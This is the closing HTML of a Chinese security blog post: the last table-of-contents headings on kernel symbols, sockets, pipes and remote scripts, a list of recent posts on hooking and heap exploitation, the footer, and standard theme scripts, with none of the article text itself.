href="#%E8%AF%BB%E5%8F%96%E5%86%85%E6%A0%B8%E6%96%87%E4%BB%B6%E7%AC%A6%E5%8F%B7%E8%A1%A8%E5%8F%8A%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BD%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">14.3.</span> <span class="toc-text">读取内核文件符号表及内核加载基地址</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#eth0-1"><span class="toc-number">15.</span> <span class="toc-text">eth0&#x2F;1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#socket"><span class="toc-number">16.</span> <span class="toc-text">socket</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%A1%E9%81%93-1"><span class="toc-number">17.</span> <span class="toc-text">管道</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%84%9A%E6%9C%AC"><span class="toc-number">18.</span> <span class="toc-text">远程脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%84%9A%E6%9C%AC-1"><span class="toc-number">18.1.</span> <span class="toc-text">远程脚本</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/28/android%E4%B9%8Bhook%E5%85%A5%E9%97%A8/" title="android之hook入门">android之hook入门</a><time datetime="2025-03-28T12:10:45.000Z" title="发表于 2025-03-28 20:10:45">2025-03-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/03/%E5%9B%BA%E4%BB%B6%E4%B8%8B%E7%9A%84hook-patch/" title="固件下的hook &amp; patch">固件下的hook &amp; patch</a><time datetime="2025-03-03T08:26:16.000Z" title="发表于 2025-03-03 16:26:16">2025-03-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/21/how2heap/" title="how2heap">how2heap</a><time datetime="2025-02-21T12:41:20.000Z" title="发表于 2025-02-21 20:41:20">2025-02-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/13/Hexagon%E5%AD%A6%E4%B9%A0/" title="Hexagon学习">Hexagon学习</a><time datetime="2025-02-13T07:36:57.000Z" title="发表于 2025-02-13 15:36:57">2025-02-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/01/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" title="2024年终总结">2024年终总结</a><time datetime="2025-02-01T08:50:35.000Z" title="发表于 2025-02-01 16:50:35">2025-02-01</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281616326.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By s1nec-1o</div><div class="footer_custom_text">介是s1nec-1o的博客</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div><canvas id="snow" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;pointer-events:none"></canvas></div><script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script><script async type="text/javascript" src="https://cdn.jsdelivr.net/gh/Candinya/Kratos-Rebirth@latest/source/js/snow.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>